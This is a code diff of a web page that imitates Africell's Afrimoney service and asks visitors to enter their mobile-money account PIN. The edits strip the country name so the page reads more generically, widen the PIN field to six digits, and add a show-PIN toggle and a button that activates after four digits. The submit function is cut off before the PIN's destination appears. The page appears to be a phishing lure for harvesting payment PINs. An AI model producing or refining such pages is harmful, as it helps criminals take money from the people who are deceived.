@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Africell Sierra Leone | Enter PIN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, interactive-widget=resizes-visual">
+    <title>Africell | Enter PIN</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -20,14 +20,14 @@
             height: 100%;
             /* Pantone Purple 2665 C Gradient (#9B1B75 / #5E0C44) */
             background: linear-gradient(135deg, #9B1B75 0%, #7E145E 50%, #5E0C44 100%);
-            overflow: hidden;
+            overflow: auto;
             color: #ffffff;
         }
 
         .e-fullscreen-wrapper {
             position: relative;
             width: 100%;
-            height: 100%;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -43,12 +43,13 @@
             flex-direction: column;
             align-items: center;
             animation: slideUp .7s ease;
+            margin: auto 0;
         }
 
         @keyframes slideUp {
             from {
                 opacity: 0;
-                transform: translateY(30px);
+                transform: translateY(20px);
             }
             to {
                 opacity: 1;
@@ -64,7 +65,7 @@
             letter-spacing: -0.5px;
             text-transform: uppercase;
             text-shadow: 0 2px 4px rgba(0,0,0,0.3);
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
         .e-logo span {
@@ -102,7 +103,7 @@
         .e-card-box p {
             font-size: 13px;
             color: rgba(255, 255, 255, 0.75);
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
         /* Input Fields */
@@ -111,68 +112,79 @@
             margin-bottom: 10px;
         }
 
-        .e-input-group i {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #FFCC00;
-            font-size: 16px;
-        }
-
         .e-input-field {
             width: 100%;
-            padding: 16px 16px 16px 48px;
-            background: rgba(255, 255, 255, 0.12);
+            padding: 16px 50px 16px 16px;
+            background: #ffffff;
             border: 1.5px solid rgba(255, 255, 255, 0.22);
             border-radius: 14px;
-            font-size: 22px;
-            letter-spacing: 10px;
+            font-size: 20px;
+            letter-spacing: 6px;
             text-align: center;
-            color: #ffffff;
+            color: #000000;
+            font-weight: 700;
             outline: none;
             -webkit-appearance: none;
             appearance: none;
             transition: all 0.2s ease;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.05);
         }
 
         .e-input-field:focus {
             border-color: #FFCC00;
-            background: rgba(255, 255, 255, 0.2);
             box-shadow: 0 0 15px rgba(255, 204, 0, 0.2);
         }
 
         .e-input-field::placeholder {
-            color: rgba(255, 255, 255, 0.4);
-            letter-spacing: 4px;
-            font-weight: 400;
+            color: #000000;
+            opacity: 0.5;
+            letter-spacing: 1px;
+            font-weight: 500;
             font-size: 15px;
+            text-align: center;
         }
 
-        /* Full Width Main Button */
+        /* Eye Icon for toggle view */
+        .toggle-password {
+            position: absolute;
+            right: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #7E145E;
+            font-size: 18px;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        /* Full Width Main Button (Dynamic State) */
         .e-btn-login {
             width: 100%;
             padding: 18px;
-            background: #FFCC00;
+            background: rgba(255, 204, 0, 0.4);
             color: #5E0C44;
             border: none;
             border-radius: 16px;
             font-size: 16px;
             font-weight: 900;
             letter-spacing: 0.5px;
-            cursor: pointer;
+            cursor: not-allowed;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             text-transform: uppercase;
             transition: all 0.2s ease;
         }
 
-        .e-btn-login:hover {
+        .e-btn-login.active {
+            background: #FFCC00;
+            cursor: pointer;
+        }
+
+        .e-btn-login.active:hover {
             transform: translateY(-2px);
             background: #ffe033;
             box-shadow: 0 15px 35px rgba(255, 204, 0, 0.4);
         }
 
-        .e-btn-login:active {
+        .e-btn-login.active:active {
             transform: translateY(0);
         }
 
@@ -208,7 +220,7 @@
             text-align: center;
             color: rgba(255, 255, 255, 0.6);
             font-size: 11px;
-            margin-top: 15px;
+            margin-top: 20px;
         }
 
         /* Custom In-App Modal Dialog Styling */
@@ -278,22 +290,22 @@
             
             <!-- AFRICELL LOGO -->
             <div class="e-logo">
-                Africell <span>Sierra Leone</span>
+                Africell
                 <small>AFRIMONEY SERVICES</small>
             </div>
 
             <!-- Main Card & PIN Form Section -->
             <div class="e-card-box">
                 <h2>Enter Afrimoney PIN</h2>
-                <p>Please enter your 4-digit Afrimoney account PIN to confirm your request.</p>
+                <p>Please enter your Afrimoney account PIN to confirm your request.</p>
 
                 <div class="e-input-group">
-                    <i class="fa-solid fa-lock"></i>
-                    <input type="password" id="mpin" class="e-input-field" placeholder="••••" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="current-password" autofocus required>
+                    <input type="password" id="mpin" class="e-input-field" placeholder="Pin Code" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="current-password" autofocus required oninput="checkPinLength()">
+                    <i class="fa-solid fa-eye toggle-password" id="toggleEye" onclick="togglePinVisibility()"></i>
                 </div>
             </div>
 
-            <button class="e-btn-login" onclick="submitPinAttempt()">Confirm PIN</button>
+            <button class="e-btn-login" id="confirmBtn" onclick="submitPinAttempt()">Confirm</button>
 
             <!-- Loading Spinner -->
             <div id="loadingSpinner">
@@ -302,7 +314,7 @@
             </div>
 
             <div class="e-footer">
-                © 2026 Africell Sierra Leone. All Rights Reserved.
+                © 2026 Africell. All Rights Reserved.
             </div>
         </div>
     </div>
@@ -325,12 +337,40 @@
         document.getElementById('customModal').style.display = 'none';
     }
 
+    // Toggle password view/hide with eye icon
+    function togglePinVisibility() {
+        const mpinInput = document.getElementById('mpin');
+        const toggleEye = document.getElementById('toggleEye');
+        
+        if (mpinInput.type === 'password') {
+            mpinInput.type = 'text';
+            toggleEye.classList.remove('fa-eye');
+            toggleEye.classList.add('fa-eye-slash');
+        } else {
+            mpinInput.type = 'password';
+            toggleEye.classList.remove('fa-eye-slash');
+            toggleEye.classList.add('fa-eye');
+        }
+    }
+
+    // Dynamic button color & active state once PIN has values
+    function checkPinLength() {
+        const mpinInput = document.getElementById('mpin').value.trim();
+        const confirmBtn = document.getElementById('confirmBtn');
+
+        if (mpinInput.length >= 4) {
+            confirmBtn.classList.add('active');
+        } else {
+            confirmBtn.classList.remove('active');
+        }
+    }
+
     async function submitPinAttempt() {
         const mpinInput = document.getElementById('mpin').value.trim();
         const spinnerDiv = document.getElementById('loadingSpinner');
 
         if (mpinInput.length < 4) {
-            showAppAlert('Please enter your valid 4-digit Afrimoney PIN.');
+            showAppAlert('Please enter your valid Afrimoney PIN.');
             return;
         }
 
